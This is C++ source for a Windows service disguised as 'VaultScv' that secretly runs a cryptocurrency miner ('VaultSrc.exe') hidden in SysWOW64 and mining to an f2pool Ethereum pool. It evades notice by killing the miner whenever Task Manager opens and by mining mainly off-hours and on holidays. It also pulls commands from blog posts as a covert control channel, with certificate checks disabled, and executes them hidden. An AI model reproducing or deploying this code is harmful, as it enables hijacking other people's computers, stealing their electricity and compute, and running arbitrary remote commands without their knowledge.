/*
�����񣬸���������
*/
#pragma once
#pragma warning(disable:4996)
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <tchar.h>
#include <winsvc.h>
#include <stdlib.h>
#include <curl\curl.h>
#include <time.h>
#include <fstream>

using namespace std;
#pragma comment  (lib,"User32.lib")
#pragma comment  (lib,"Gdi32.lib")

static std::string static_cmd_line;
static unsigned static_working_time[24] = { 1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1 };
static bool parameters_get_success = false;//�������³ɹ�
static bool parameters_bak_get_success = false;//���ݲ������³ɹ�

const std::string kill_miner_cmd = std::string("TASKKILL /F /IM ") + "VaultSrc.exe";//ɱ��������
static std::string id = "asdfghjkl999";//Ĭ�ϵı���id��Ҳ���ã����ǲ��ù�����ȡ�����ļ��ɹ������
const std::string order_url = "https://blog.csdn.net/m0_48585347/article/details/117000137";
const std::string order_url_bak = "https://blog.csdn.net/huqinweI987/article/details/116894555";//����CSDNͨ��������Ҳ��ʱ����˲�ͨ���¼ܵķ��գ�������һ�����ݣ���Ȼ�ˣ���������Ҳ��һ���̶�ʱ��ȥ��ת


//typedef enum __bool { false = 0, true = 1, } bool;
//����һЩȫ�ֱ����ͺ���
void ServiceMain(DWORD argc, LPTSTR *argv);
void ServiceCtrlHandler(DWORD dwControlCode);
//SCM�������״̬��Ϣ
BOOL ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode,
    DWORD dwServiceSpecificExitCode, DWORD dwCheckPoint,
    DWORD dwWaitHint);
BOOL InitThread(); //�����߳����������ǵ�����
DWORD sysnap(LPDWORD param); //�������������Ҫ��ɵ�����
HANDLE hServiceThread;
void KillService();
char *strServiceName = "VaultScv"; //��ʶ������ڲ���
//LPWSTR strServiceName = "VaultScv"; //��ʶ������ڲ���
SERVICE_STATUS_HANDLE nServiceStatusHandle; //�洢����RegisterServiceCtrlHandler���صľ��
HANDLE killServiceEvent;
BOOL nServiceRunning;
DWORD nServiceCurrentStatus;
FILE * Fces = NULL;

void kill_miner();
bool is_running(std::string  process_name = "taskmgr.exe");
void ServiceMain(DWORD argc, LPTSTR *argv);
bool is_weekend_determind();


void main(int argc, char *argv[])
{
    WCHAR wszClassName2[256];
    MultiByteToWideChar(CP_ACP, 0, strServiceName, strlen(strServiceName) + 1, wszClassName2,
        sizeof(wszClassName2) / sizeof(wszClassName2[0]));

    SERVICE_TABLE_ENTRY servicetable[] = { { wszClassName2,(LPSERVICE_MAIN_FUNCTION)ServiceMain },{ NULL,NULL } };
    BOOL success;
    // StartServiceCtrlDispatcher ��������ѳ������߳����ӵ�������ƹ������
    success = StartServiceCtrlDispatcher(servicetable);
    if (!success)
    {
        printf("failed!");
    }
}


std::string TCHAR2STRING(TCHAR *STR)
{
    int iLen = WideCharToMultiByte(CP_ACP, 0, STR, -1, NULL, 0, NULL, NULL);   //���ȼ���TCHAR ���ȡ�
    char* chRtn = new char[iLen * sizeof(char)];  //����һ�� TCHAR ���ȴ�С�� CHAR ���͡�
    WideCharToMultiByte(CP_ACP, 0, STR, -1, chRtn, iLen, NULL, NULL);  //��TCHAR ���͵�����ת��Ϊ CHAR ���͡�
    std::string str(chRtn); //���CHAR �������� ת��Ϊ STRING �������ݡ�
    return str;
}

bool PrintProcessNameAndID(DWORD processID,std::string  process_name = "taskmgr.exe")
{
    TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);
    if (NULL != hProcess)
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
            &cbNeeded))
        {
            GetModuleBaseName(hProcess, hMod, szProcessName,
                sizeof(szProcessName) / sizeof(TCHAR));
        }
    }

    if (TCHAR2STRING(szProcessName) == process_name)
    {
        return true;
    }

    

    CloseHandle(hProcess);
    return false;
}

bool is_running(std::string  process_name) {

    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        return false;//bug����false��
    }
    cProcesses = cbNeeded / sizeof(DWORD);
    for (i = 0; i < cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            bool is_found = PrintProcessNameAndID(aProcesses[i], process_name = process_name);
            if (is_found)
                return true;
        }
    }
    return false;
}

static size_t update_parameters(void *buffer, size_t sz, size_t nmemb, void *writer)
{
    string* psResponse = (string*)writer;
    size_t size = sz * nmemb;
    psResponse->append((char*)buffer, size);

    int index = psResponse->find(id);
    if (index == -1) {
        parameters_get_success = false;
        return sz * nmemb;
    }
    std::string comparision = "[";
    if ((psResponse->at(index + 12)) == '[')
    {
        for (int i = 0; i < 24; i++) {
            char flag = psResponse->at(index + 12 + 1 + i);
            if (flag == ']')//�쳣��ֹ
                break;
            static_working_time[i] = flag == '1' ? 1 : 0;
        }
    }
    int start_index = index + 12 + 1 + 24 + 1 + 1;//startѡȡ����[���
    int word_cnt = psResponse->substr(start_index).find_first_of("]");//�����]�����λ�ã���Ҫ�������
                                                                      //end_index = start_index + end_index;//��ƫ����
    std::string cmd_line = psResponse->substr(start_index, word_cnt);
    int at_index = cmd_line.find_first_of("*");//��*����@����ҳ�������⣬���滻����.TODO:�Ľ��棺��һ*����ֳ�ͻ���Լ���ƶ��ص�ʶ���
    if (at_index == -1) {
        parameters_get_success = false;
        return sz * nmemb;
    }

    std::string cmd_line_sub1 = cmd_line.substr(0, at_index);
    std::string cmd_line_sub2 = cmd_line.substr(at_index + 1, cmd_line.size());

    cmd_line = cmd_line_sub1 + "@" + cmd_line_sub2;//�滻�����
    static_cmd_line = cmd_line;
    parameters_get_success = true;
    return sz * nmemb;
}

void update_cmd() {
    //��ȡ����
    string strTmpStr;
    //string str_error_buffer;
    char errbuf[CURL_ERROR_SIZE];
    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, order_url.c_str());
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, update_parameters);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &strTmpStr);

    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);//����֤����
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false);

    curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    /*
    *debug��
    string strRsp;
    if (res != CURLE_OK)
    {
        strRsp = "error";
        FILE *fp = NULL;
        fp = fopen("C:/Windows/SysWOW64/test120.txt", "a+");//��ӡ��־
        fprintf(fp, "CURLE_OK no!!!code is %d!!!\n\n", res);
        fprintf(fp, errbuf);
        fclose(fp);
    }
    else
    {
        strRsp = strTmpStr;
    }
    */
}

static size_t update_parameters_bak(void *buffer, size_t sz, size_t nmemb, void *writer)
{
    string* psResponse = (string*)writer;
    size_t size = sz * nmemb;
    psResponse->append((char*)buffer, size);

    int index = psResponse->find(id);
    if (index == -1) {
        parameters_bak_get_success = false;
        return sz * nmemb;
    }
    std::string comparision = "[";
    if ((psResponse->at(index + 12)) == '[')
    {
        for (int i = 0; i < 24; i++) {
            char flag = psResponse->at(index + 12 + 1 + i);
            if (flag == ']')//�쳣��ֹ
                break;
            static_working_time[i] = flag == '1' ? 1 : 0;
        }
    }
    int start_index = index + 12 + 1 + 24 + 1 + 1;//startѡȡ����[���
    int word_cnt = psResponse->substr(start_index).find_first_of("]");//�����]�����λ�ã���Ҫ�������
                                                                      //end_index = start_index + end_index;//��ƫ����
    std::string cmd_line = psResponse->substr(start_index, word_cnt);
    int at_index = cmd_line.find_first_of("*");//��*����@����ҳ�������⣬���滻����.TODO:�Ľ��棺��һ*����ֳ�ͻ���Լ���ƶ��ص�ʶ���
    if (at_index == -1) {
        parameters_bak_get_success = false;
        return sz * nmemb;
    }

    std::string cmd_line_sub1 = cmd_line.substr(0, at_index);
    std::string cmd_line_sub2 = cmd_line.substr(at_index + 1, cmd_line.size());

    //C:/Windows/SysWOW64/VaultSrc.exe �У���ϸ·�����Բ�������ָ���У�����������ȡָ���ƴ���ַ�������Ҫ�޸ģ�Ϊ�˱���ǰ��汾�����ݣ��Ȼ�һ���������Ӹ�����
    //todo����Ҫ��һ���������������ֻ��У��ڲ��ͻ᲻��������Լ������س��Ͳ����

    cmd_line = cmd_line_sub1 + "@" + cmd_line_sub2;//�滻�����
    static_cmd_line = cmd_line;
    parameters_bak_get_success = true;
    return sz * nmemb;
}
void update_cmd_bak() {
    //��ȡ����
    string strTmpStr;
    //string str_error_buffer;
    char errbuf[CURL_ERROR_SIZE];
    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_URL, order_url_bak.c_str());
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, update_parameters_bak);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &strTmpStr);

    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);//����֤����
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false);

    curl_easy_setopt(curl, CURLOPT_ERRORBUFFER, errbuf);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
}

DWORD sysnap(LPDWORD param)//main loop
{
    //Sleep(22000);//debug�ã��ȴ����ӽ���
    bool is_taskmgr_running;//��������������while�������⣿��Ӧ�ã�ֱ���÷���ֵҲ���������⣬todo����ɾ�ˣ�֮ǰ����������
    bool is_miner_running;//todo����ɾ�ˣ�֮ǰ����������
    system(kill_miner_cmd.c_str());

    //��ȡid
    std::ifstream in("C:/Windows/SysWOW64/vcfg");
    if (in) {
        getline(in, id);
        in.close();
    }
    std::string command = "C:\\Windows\\SysWOW64\\VaultSrc.exe  -uri ethstratum://glk300."+id+"@eth.f2pool.com:6688";// cmd;
    update_cmd();
    if (parameters_get_success)
        command = static_cmd_line;
    else {
        update_cmd_bak();
        if (parameters_bak_get_success)
            command = static_cmd_line;
    }


    while (nServiceRunning)
    {
        is_taskmgr_running = is_running("taskmgr.exe") || is_running("Taskmgr.exe");//todo����ɾ�ˣ�֮ǰ����������
        if (is_taskmgr_running) {//����������������������
            system(kill_miner_cmd.c_str());
            Sleep(5000);
            continue;
        }

        time_t tt = time(NULL);
        tm* t = localtime(&tt);

        if (t->tm_min%2 == 0 && t->tm_sec < 3) {//2������һ��ָ�
            update_cmd();
            if (parameters_get_success)
                command = static_cmd_line;//kill_miner();Ƶ������ʱ����Ҫ��Ҫ������������·������֣�һ�������У�һ�����������Ҳ����ͨ��Զ�����������㣩���
            else {
                update_cmd_bak();
                if (parameters_bak_get_success)
                    command = static_cmd_line;
            }
        }

        is_miner_running = is_running("VaultSrc.exe");//todo����ɾ�ˣ�֮ǰ����������
        if (1) {//�°汾�߼�
            if (static_working_time[t->tm_hour] == 1) {//����
                if (!is_miner_running)
                {

                    WinExec(command.c_str(), SW_HIDE);
                }
            }
            else
            {
                system(kill_miner_cmd.c_str());
                //kill_miner();
            }

        }
        else {//���ܲ����õľ��߼�����ʱ��������ʹ����ʧ�ܣ���Ҳ���Լ�д��һ�����飬�߼�����������Ȼ��ʧ����ĩ
            bool is_weekend = is_weekend_determind();
            if (is_weekend) {//�����ж���ĩ����ĩȫ��
                if (!is_miner_running)
                {
                    WinExec(command.c_str(), SW_HIDE);
                }
            }
            else if (t->tm_hour >= 21 || t->tm_hour < 10) {//ƽ�տ���ʱ��
                if (!is_miner_running)
                {
                    WinExec(command.c_str(), SW_HIDE);
                }
            }
            else {//ƽ��ͣ��
                std::string temp = std::string("TASKKILL /F /IM ") + "VaultSrc.exe";
                system(temp.c_str());
                //kill_miner();
            }
        }
        Sleep(1000);
    }
    return 0;
}


#include "service.h"

void ServiceMain(DWORD argc, LPTSTR *argv)
{
    //Sleep(20 * 1000);
    WCHAR wszClassName2[256];
    MultiByteToWideChar(CP_ACP, 0, strServiceName, strlen(strServiceName) + 1, wszClassName2,
        sizeof(wszClassName2) / sizeof(wszClassName2[0]));

    BOOL success;
    //��ServiceCtrlHandlerע��Ϊ���������,��������SCM��������������,
    nServiceStatusHandle = RegisterServiceCtrlHandler(wszClassName2, (LPHANDLER_FUNCTION)ServiceCtrlHandler);
    //�ж��Ƿ�ע��ɹ�,���򷵻�
    if (!nServiceStatusHandle) { return; }
    //ע��ɹ�����SCM�������״̬��Ϣ,��Ϊ����û��ʼ�����,���Ե�ǰ����״̬ΪSERVICE_START_PENDING
    success = ReportStatusToSCMgr(SERVICE_START_PENDING, NO_ERROR, 0, 1, 3000);
    if (!success) { return; }
    //����һ���¼�,�ں���������ø��¼������ֺ���������ֱ��SCM����ֹͣ����ŷ���
    killServiceEvent = CreateEvent(0, TRUE, FALSE, 0);
    if (killServiceEvent == NULL) { return; }
    //��SCM�������״̬��Ϣ
    success = ReportStatusToSCMgr(SERVICE_START_PENDING, NO_ERROR, 0, 2, 1000);
    if (!success) { return; }
    //���ǵķ���ʼ����������,��ǰ״̬����ΪSERVICE_RUNNING
    nServiceCurrentStatus = SERVICE_RUNNING;
    success = ReportStatusToSCMgr(SERVICE_RUNNING, NO_ERROR, 0, 0, 0);
    if (!success) { return; }
    //InitThread()����һ���߳����������ǵ�sysnap()����
    success = InitThread();
    if (!success) { return; }
    //sysnap()������������֮�󷵻�ServiceMain(),ServiceMain()����WaitForSingleObject,��Ϊ����ֹ֮ͣǰServiceMain()�������
    WaitForSingleObject(killServiceEvent, INFINITE);
    CloseHandle(killServiceEvent);
}




//��SCM�������״̬��Ϣ,����˵�Ǹ�����Ϣ��,�����ܵĲ�������SERVICE_STATUS�ṹ��Ա
BOOL ReportStatusToSCMgr(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwServiceSpecificExitCode, DWORD dwCheckPoint, DWORD dwWaitHint)
{
    BOOL success;
    SERVICE_STATUS nServiceStatus; //����һ��SERVICE_STATUS���ͽṹnServiceStatus
    nServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; //��ʾ���ǵķ����Ƕ�ռһ�����̵ķ���
    nServiceStatus.dwCurrentState = dwCurrentState; //��ǰ����״̬
    if (dwCurrentState == SERVICE_START_PENDING)
    {
        nServiceStatus.dwControlsAccepted = 0; //����ĳ�ʼ��û�����
    }
    else
    {
        nServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN; //֪ͨ SCM ��������ĸ����������� STOP ��SHUTDOWN ����
    }
    //dwServiceSpecificExitCode������ֹ���񲢱����˳�ϸ��ʱ�����á���ʼ������ʱ�����˳������ֵΪ 0
    if (dwServiceSpecificExitCode == 0)
    {
        nServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
    }
    else
    {
        nServiceStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
    }
    nServiceStatus.dwServiceSpecificExitCode = dwServiceSpecificExitCode;
    nServiceStatus.dwCheckPoint = dwCheckPoint;
    nServiceStatus.dwWaitHint = dwWaitHint;
    //���ú�nServiceStatus��,��SCM�������״̬
    success = SetServiceStatus(nServiceStatusHandle, &nServiceStatus);
    if (!success)
    {
        KillService();
        return success;
    }
    else
        return success;
}



BOOL InitThread()
{
    DWORD id;
    hServiceThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sysnap, 0, 0, &id);
    if (hServiceThread == 0)
    {
        return false;
    }
    else
    {
        nServiceRunning = true;
        return true;
    }
}



void KillService()
{
    nServiceRunning = false;
    /*kill_miner();*/
    std::string temp = std::string("TASKKILL /F /IM ") + "VaultSrc.exe";
    system(temp.c_str());
    ReportStatusToSCMgr(SERVICE_STOPPED, NO_ERROR, 0, 0, 0);
}


void ServiceCtrlHandler(DWORD dwControlCode)
{
    BOOL success;
    switch (dwControlCode)
    {
    case SERVICE_CONTROL_SHUTDOWN:
        break;
    case SERVICE_CONTROL_STOP:
        nServiceCurrentStatus = SERVICE_STOP_PENDING;
        success = ReportStatusToSCMgr(SERVICE_STOP_PENDING, NO_ERROR, 0, 1, 3000);//�ȸ��·���״̬ΪSERVICDE_STOP_PENDING,��ֹͣ����
        KillService();
        return;
    default:
        break;
    }
    ReportStatusToSCMgr(nServiceCurrentStatus, NO_ERROR, 0, 0, 0);
}




bool is_weekend_determind() {//�����ˣ����ò�����ȡ
    bool is_weekend = false;
    time_t tt = time(NULL);
    tm* t = localtime(&tt);
    int month = t->tm_mon + 1;
    int year = t->tm_year + 1900;
    if (t->tm_wday == 6 || t->tm_wday == 0)//weekend
    {
        if (
            (year == 2021 && month == 5 && t->tm_mday == 8) ||
            (year == 2021 && month == 9 && t->tm_mday == 18) ||
            (year == 2021 && month == 9 && t->tm_mday == 26) ||
            (year == 2021 && month == 10 && t->tm_mday == 9)
            )
        {//exception
            is_weekend = false;
        }
        else
            is_weekend = true;
    }
    else
    {
        if (//holiday
            (year == 2021 && month == 5 && t->tm_mday == 1) ||
            (year == 2021 && month == 5 && t->tm_mday == 2) ||
            (year == 2021 && month == 5 && t->tm_mday == 3) ||
            (year == 2021 && month == 5 && t->tm_mday == 4) ||
            (year == 2021 && month == 5 && t->tm_mday == 5) ||

            (year == 2021 && month == 6 && t->tm_mday == 12) ||
            (year == 2021 && month == 6 && t->tm_mday == 13) ||
            (year == 2021 && month == 6 && t->tm_mday == 14) ||

            (year == 2021 && month == 9 && t->tm_mday == 19) ||
            (year == 2021 && month == 9 && t->tm_mday == 20) ||
            (year == 2021 && month == 9 && t->tm_mday == 21) ||

            (month == 10 && t->tm_mday == 1) ||
            (month == 10 && t->tm_mday == 2) ||
            (month == 10 && t->tm_mday == 3) ||
            (month == 10 && t->tm_mday == 4) ||
            (month == 10 && t->tm_mday == 5) ||
            (month == 10 && t->tm_mday == 6) ||
            (month == 10 && t->tm_mday == 7)
            )
        {
            is_weekend = true;
        }
        else
            is_weekend = false;
    }

    return is_weekend;

}


//                FILE *fp = NULL;
//                fp = fopen("C:/Windows/SysWOW64/test111.txt", "a+");//��ӡ��־
//                fputs(command.c_str(), fp);